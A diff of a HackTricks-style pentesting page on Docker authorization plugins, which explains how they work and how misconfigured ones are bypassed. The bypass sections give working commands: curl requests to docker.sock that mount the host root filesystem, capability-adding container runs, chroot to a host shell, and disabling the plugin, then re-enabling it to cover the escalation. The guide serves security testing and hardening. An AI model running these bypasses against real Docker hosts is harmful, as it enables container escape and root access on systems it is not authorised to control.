@@ -17,11 +17,9 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 </details>
 
 
-# AuthZ& AuthN - Docker Access Authorization Plugin
-
 **Docker’s** out-of-the-box **authorization** model is **all or nothing**. Any user with permission to access the Docker daemon can **run any** Docker client **command**. The same is true for callers using Docker’s Engine API to contact the daemon. If you require **greater access control**, you can create **authorization plugins** and add them to your Docker daemon configuration. Using an authorization plugin, a Docker administrator can **configure granular access** policies for managing access to the Docker daemon.
 
-## Basic architecture
+# Basic architecture
 
 Docker Auth plugins are **external** **plugins** you can use to **allow/deny** **actions** requested to the Docker Daemon **depending** on the **user** that requested it and the **action** **requested**.
 
@@ -39,13 +37,13 @@ For commands that can potentially hijack the HTTP connection (`HTTP Upgrade`), s
 
 During request/response processing, some authorization flows might need to do additional queries to the Docker daemon. To complete such flows, plugins can call the daemon API similar to a regular user. To enable these additional queries, the plugin must provide the means for an administrator to configure proper authentication and security policies.
 
-### Several Plugins
+## Several Plugins
 
 You are responsible for **registering** your **plugin** as part of the Docker daemon **startup**. You can install **multiple plugins and chain them together**. This chain can be ordered. Each request to the daemon passes in order through the chain. Only when **all the plugins grant access** to the resource, is the access granted.
 
-## Plugin Examples
+# Plugin Examples
 
-### Twistlock AuthZ Broker
+## Twistlock AuthZ Broker
 
 The plugin [**authz**](https://github.com/twistlock/authz) allows you to create a simple **JSON** file that the **plugin** will be **reading** to authorize the requests. Therefore, it gives you the opportunity to control very easily which API endpoints can reach each user.
 
@@ -53,29 +51,29 @@ This is an example that will allow Alice and Bob can create new containers: `{"n
 
 In the page [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) you can find the relation between the requested URL and the action. In the page [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) you can find the relation between the action name and the action
 
-### Simple Plugin Tutorial
+## Simple Plugin Tutorial
 
 You can find an **easy to understand plugin** with detailed information about installation and debugging here: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
 
 Read the `README` and the `plugin.go` code to understand how is it working.
 
-## Docker Auth Plugin Bypass
+# Docker Auth Plugin Bypass
 
-### Enumerate access
+## Enumerate access
 
 The main things to check are the **which endpoints are allowed** and **which values of HostConfig are allowed**.
 
 To perform this enumeration you can **use the tool** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
 
-### disallowed `run --privileged`
+## disallowed `run --privileged`
 
-#### Minimum Privileges
+### Minimum Privileges
 
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
 
-#### Running a container and then getting a privileged session
+### Running a container and then getting a privileged session
 
 In this case the sysadmin **disallowed users to mount volumes and run containers with the `--privileged` flag** or give any extra capability to the container:
 
@@ -101,7 +99,7 @@ docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a3
 
 Now, the user can escape from the container using any of the [**previously discussed techniques**](./#privileged-flag) and **escalate privileges** inside the host.
 
-### Mount Writable Folder
+## Mount Writable Folder
 
 In this case the sysadmin **disallowed users to run containers with the `--privileged` flag** or give any extra capability to the container, and he only allowed to mount the `/tmp` folder:
 
@@ -122,15 +120,15 @@ Note that maybe you cannot mount the folder `/tmp` but you can mount a **differe
 Note also that if you can **mount `/etc`** or any other folder **containing configuration files**, you may change them from the docker container as root in order to **abuse them in the host** and escalate privileges (maybe modifying `/etc/shadow`)
 {% endhint %}
 
-### Unchecked API Endpoint
+## Unchecked API Endpoint
 
 The of the sysadmin configuring this plugin would be to control which actions and with which privileges each user can perform. Therefore, if the admin takes a **blacklist** approach with the endpoints and the attributes he might **forget some of them** that could allow an attacker to **escalate privileges.**
 
 You can check the docker API in [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
-### Unchecked JSON Structure
+## Unchecked JSON Structure
 
-#### Binds in root
+### Binds in root
 
 It's possible that when the sysadmin configured the docker firewall he **forgot about some important parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Binds**".\
 In the following example it's possible to abuse this misconfiguration to create and run a container that mounts the root (/) folder of the host:
@@ -149,7 +147,7 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 Note how in this example we are using the **`Binds`** param as a root level key in the JSON but in the API it appears under the key **`HostConfig`**
 {% endhint %}
 
-#### Binds in HostConfig
+### Binds in HostConfig
 
 Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
 
@@ -157,7 +155,7 @@ Follow the same instruction as with **Binds in root** performing this **request*
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
 
-#### Mounts in root
+### Mounts in root
 
 Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
 
@@ -165,7 +163,7 @@ Follow the same instruction as with **Binds in root** performing this **request*
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
 
-#### Mounts in HostConfig
+### Mounts in HostConfig
 
 Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
 
@@ -173,7 +171,7 @@ Follow the same instruction as with **Binds in root** performing this **request*
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
 
-### Unchecked JSON Attribute
+## Unchecked JSON Attribute
 
 It's possible that when the sysadmin configured the docker firewall he **forgot about some important attribute of a parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Capabilities**" inside "**HostConfig**". In the following example it's possible to abuse this misconfiguration to create and run a container with the **SYS\_MODULE** capability:
 
@@ -191,7 +189,7 @@ capsh --print
 The **`HostConfig`** is the key that usually contains the **interesting** **privileges** to escape from the container. However, as we have discussed previously, note how using Binds outside of it also works and may allow you to bypass restrictions.
 {% endhint %}
 
-### Disabling Plugin
+## Disabling Plugin
 
 If the **sysadmin** **forgotten** to **forbid** the ability to **disable** the **plugin**, you can take advantage of this to completely disable it!
 
@@ -209,11 +207,11 @@ docker plugin enable authobot
 
 Remember to **re-enable the plugin after escalating**, or a **restart of docker service won’t work**!
 
-### Auth Plugin Bypass writeups
+## Auth Plugin Bypass writeups
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
-## References
+# References
 
 * [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)
 
